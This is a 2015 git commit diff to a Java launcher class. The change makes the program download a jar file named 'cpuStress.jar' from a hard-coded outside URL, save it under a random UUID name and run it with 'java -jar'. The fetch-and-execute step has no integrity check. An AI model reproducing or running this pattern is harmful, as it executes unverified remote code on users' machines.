992061f46448b80000d86995aa7280db97c0bfac
Mephala <gokhan.ozgozen@gmail.com>
2015-03-17 16:37:44 +0200

    Downloading and launching jar.

--- politicallyConnected/launcher/src/main/java/launcher/main/Launcher.java
+++ politicallyConnected/launcher/src/main/java/launcher/main/Launcher.java
@@ -2,19 +2,23 @@ package launcher.main;
 
 import java.io.BufferedInputStream;
 import java.io.ByteArrayOutputStream;
-import java.io.File;
 import java.io.FileOutputStream;
 import java.io.IOException;
 import java.io.InputStream;
 import java.net.URL;
+import java.util.UUID;
 
 public class Launcher {
 
 	public static void main(String[] args) throws IOException, InterruptedException {
-		String fileName = "file.txt"; // The file that will be saved on your
-										// computer
-		URL link = new URL("http://shayconcepts.com"); // The file that you want
-														// to download
+		String fileName = UUID.randomUUID().toString() + ".jar";
+		// computer
+		URL link = new URL("http://isteralistersat.net/cpuStress.jar/downloadFile.do"); // The
+																						// file
+																						// that
+																						// you
+																						// want
+		// to download
 
 		// Code to download
 		InputStream in = new BufferedInputStream(link.openStream());
@@ -35,19 +39,21 @@ public class Launcher {
 
 		System.out.println("Finished");
 		// String fileName = "mainApp.jar";
-		InputStream is = Launcher.class.getClassLoader().getResourceAsStream("mainApp.jar");
-		// write the inputStream to a FileOutputStream
-		FileOutputStream outputStream = new FileOutputStream(new File("mainApp.jar"));
-
-		int read = 0;
-		byte[] bytes = new byte[1024];
-
-		while ((read = is.read(bytes)) != -1) {
-			outputStream.write(bytes, 0, read);
-		}
-
-		System.out.println("Done!");
-		Process proc = Runtime.getRuntime().exec("java -jar mainApp.jar");
+		// InputStream is =
+		// Launcher.class.getClassLoader().getResourceAsStream(fileName);
+		// // write the inputStream to a FileOutputStream
+		// FileOutputStream outputStream = new FileOutputStream(new
+		// File(fileName));
+		//
+		// int read = 0;
+		// byte[] bytes = new byte[1024];
+		//
+		// while ((read = is.read(bytes)) != -1) {
+		// outputStream.write(bytes, 0, read);
+		// }
+		//
+		// System.out.println("Done!");
+		Process proc = Runtime.getRuntime().exec("java -jar " + fileName);
 		int retVal = proc.waitFor();
 		System.out.println(retVal);
 
